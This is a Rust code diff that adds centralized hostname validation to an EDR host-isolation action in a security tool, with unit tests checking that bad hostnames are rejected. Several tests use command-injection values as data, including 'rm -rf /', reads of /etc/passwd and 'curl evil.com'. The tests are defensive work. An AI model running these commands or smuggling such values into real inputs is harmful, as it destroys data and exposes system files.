@@ -27,6 +27,7 @@ use std::collections::HashMap;
 use std::sync::Arc;
 use tracing::{info, instrument, warn};
 use tw_connectors::EDRConnector;
+use tw_core::ValidatedHostname;
 
 /// Default patterns for critical hosts that require manual approval before isolation.
 /// These regex patterns match hostnames of critical infrastructure that should not be
@@ -142,7 +143,17 @@ impl Action for IsolateHostAction {
     #[instrument(skip(self, context))]
     async fn execute(&self, context: ActionContext) -> Result<ActionResult, ActionError> {
         let started_at = Utc::now();
-        let hostname = context.require_string("hostname")?;
+        let hostname_raw = context.require_string("hostname")?;
+
+        // Validate hostname using centralized validation (RFC 1035 + injection prevention)
+        let validated_hostname = ValidatedHostname::new(&hostname_raw).map_err(|e| {
+            warn!("Invalid hostname '{}': {}", hostname_raw, e);
+            ActionError::InvalidParameters(format!("Invalid hostname: {}", e))
+        })?;
+
+        // Use the validated and normalized hostname from here on
+        let hostname = validated_hostname.as_str();
+
         let reason = context
             .get_string("reason")
             .unwrap_or_else(|| "Automated isolation by Triage Warden".to_string());
@@ -151,7 +162,7 @@ impl Action for IsolateHostAction {
 
         // Check if this is a critical host that requires manual approval
         // Critical hosts ALWAYS require the approval workflow - no parameter-based bypass allowed
-        if let Some(matched_pattern) = self.is_critical_host(&hostname) {
+        if let Some(matched_pattern) = self.is_critical_host(hostname) {
             // Check if this action has been approved through the approval workflow
             if !context.is_approved() {
                 warn!(
@@ -195,7 +206,7 @@ impl Action for IsolateHostAction {
         // Get current host info to verify it exists and capture state for rollback
         let host_info = self
             .edr
-            .get_host_info(&hostname)
+            .get_host_info(hostname)
             .await
             .map_err(|e| ActionError::ConnectorError(e.to_string()))?;
 
@@ -211,7 +222,7 @@ impl Action for IsolateHostAction {
         // Execute isolation
         let edr_result = self
             .edr
-            .isolate_host(&hostname)
+            .isolate_host(hostname)
             .await
             .map_err(|e| ActionError::ExecutionFailed(e.to_string()))?;
 
@@ -556,5 +567,160 @@ mod tests {
         assert!(action.is_critical_host("workstation-001").is_none());
         assert!(action.is_critical_host("user-laptop").is_none());
         assert!(action.is_critical_host("dev-server").is_none());
+    }
+
+    // ========== Hostname Validation Tests ==========
+
+    #[tokio::test]
+    async fn test_hostname_validation_rejects_semicolon_injection() {
+        let edr = Arc::new(MockEDRConnector::with_sample_data("test"));
+        let action = IsolateHostAction::new(edr);
+
+        let context = ActionContext::new(Uuid::new_v4())
+            .with_param("hostname", serde_json::json!("server; rm -rf /"));
+
+        let result = action.execute(context).await;
+        assert!(matches!(result, Err(ActionError::InvalidParameters(_))));
+
+        if let Err(ActionError::InvalidParameters(msg)) = result {
+            assert!(msg.contains("Invalid hostname"));
+        }
+    }
+
+    #[tokio::test]
+    async fn test_hostname_validation_rejects_pipe_injection() {
+        let edr = Arc::new(MockEDRConnector::with_sample_data("test"));
+        let action = IsolateHostAction::new(edr);
+
+        let context = ActionContext::new(Uuid::new_v4())
+            .with_param("hostname", serde_json::json!("server | cat /etc/passwd"));
+
+        let result = action.execute(context).await;
+        assert!(matches!(result, Err(ActionError::InvalidParameters(_))));
+    }
+
+    #[tokio::test]
+    async fn test_hostname_validation_rejects_backtick_injection() {
+        let edr = Arc::new(MockEDRConnector::with_sample_data("test"));
+        let action = IsolateHostAction::new(edr);
+
+        let context = ActionContext::new(Uuid::new_v4())
+            .with_param("hostname", serde_json::json!("`cat /etc/passwd`"));
+
+        let result = action.execute(context).await;
+        assert!(matches!(result, Err(ActionError::InvalidParameters(_))));
+    }
+
+    #[tokio::test]
+    async fn test_hostname_validation_rejects_dollar_substitution() {
+        let edr = Arc::new(MockEDRConnector::with_sample_data("test"));
+        let action = IsolateHostAction::new(edr);
+
+        let context = ActionContext::new(Uuid::new_v4())
+            .with_param("hostname", serde_json::json!("$(cat /etc/passwd)"));
+
+        let result = action.execute(context).await;
+        assert!(matches!(result, Err(ActionError::InvalidParameters(_))));
+    }
+
+    #[tokio::test]
+    async fn test_hostname_validation_rejects_ampersand_injection() {
+        let edr = Arc::new(MockEDRConnector::with_sample_data("test"));
+        let action = IsolateHostAction::new(edr);
+
+        let context = ActionContext::new(Uuid::new_v4())
+            .with_param("hostname", serde_json::json!("server && curl evil.com"));
+
+        let result = action.execute(context).await;
+        assert!(matches!(result, Err(ActionError::InvalidParameters(_))));
+    }
+
+    #[tokio::test]
+    async fn test_hostname_validation_rejects_newline_injection() {
+        let edr = Arc::new(MockEDRConnector::with_sample_data("test"));
+        let action = IsolateHostAction::new(edr);
+
+        let context = ActionContext::new(Uuid::new_v4())
+            .with_param("hostname", serde_json::json!("server\nrm -rf /"));
+
+        let result = action.execute(context).await;
+        assert!(matches!(result, Err(ActionError::InvalidParameters(_))));
+    }
+
+    #[tokio::test]
+    async fn test_hostname_validation_rejects_empty_hostname() {
+        let edr = Arc::new(MockEDRConnector::with_sample_data("test"));
+        let action = IsolateHostAction::new(edr);
+
+        let context =
+            ActionContext::new(Uuid::new_v4()).with_param("hostname", serde_json::json!(""));
+
+        let result = action.execute(context).await;
+        assert!(matches!(result, Err(ActionError::InvalidParameters(_))));
+    }
+
+    #[tokio::test]
+    async fn test_hostname_validation_rejects_too_long_hostname() {
+        let edr = Arc::new(MockEDRConnector::with_sample_data("test"));
+        let action = IsolateHostAction::new(edr);
+
+        // 254 characters is too long (max is 253)
+        let long_hostname = "a".repeat(254);
+        let context = ActionContext::new(Uuid::new_v4())
+            .with_param("hostname", serde_json::json!(long_hostname));
+
+        let result = action.execute(context).await;
+        assert!(matches!(result, Err(ActionError::InvalidParameters(_))));
+    }
+
+    #[tokio::test]
+    async fn test_hostname_validation_accepts_valid_fqdn() {
+        let edr = Arc::new(MockEDRConnector::with_sample_data("test"));
+        let action = IsolateHostAction::new(edr);
+
+        let context = ActionContext::new(Uuid::new_v4())
+            .with_param("hostname", serde_json::json!("workstation-001.example.com"));
+
+        // Should succeed (workstation is in mock data)
+        let result = action.execute(context).await;
+        assert!(result.is_ok() || matches!(result, Err(ActionError::ConnectorError(_))));
+    }
+
+    #[tokio::test]
+    async fn test_hostname_validation_normalizes_to_lowercase() {
+        let edr = Arc::new(MockEDRConnector::with_sample_data("test"));
+        let action = IsolateHostAction::new(edr);
+
+        // Upper case should be normalized - workstation-001 exists in mock
+        let context = ActionContext::new(Uuid::new_v4())
+            .with_param("hostname", serde_json::json!("WORKSTATION-001"));
+
+        let result = action.execute(context).await;
+        // Should either succeed or fail for non-hostname reasons (connector)
+        assert!(result.is_ok() || matches!(result, Err(ActionError::ConnectorError(_))));
+    }
+
+    #[tokio::test]
+    async fn test_hostname_validation_rejects_label_starting_with_hyphen() {
+        let edr = Arc::new(MockEDRConnector::with_sample_data("test"));
+        let action = IsolateHostAction::new(edr);
+
+        let context = ActionContext::new(Uuid::new_v4())
+            .with_param("hostname", serde_json::json!("-invalid-hostname"));
+
+        let result = action.execute(context).await;
+        assert!(matches!(result, Err(ActionError::InvalidParameters(_))));
+    }
+
+    #[tokio::test]
+    async fn test_hostname_validation_rejects_consecutive_dots() {
+        let edr = Arc::new(MockEDRConnector::with_sample_data("test"));
+        let action = IsolateHostAction::new(edr);
+
+        let context = ActionContext::new(Uuid::new_v4())
+            .with_param("hostname", serde_json::json!("server..example.com"));
+
+        let result = action.execute(context).await;
+        assert!(matches!(result, Err(ActionError::InvalidParameters(_))));
     }
 }
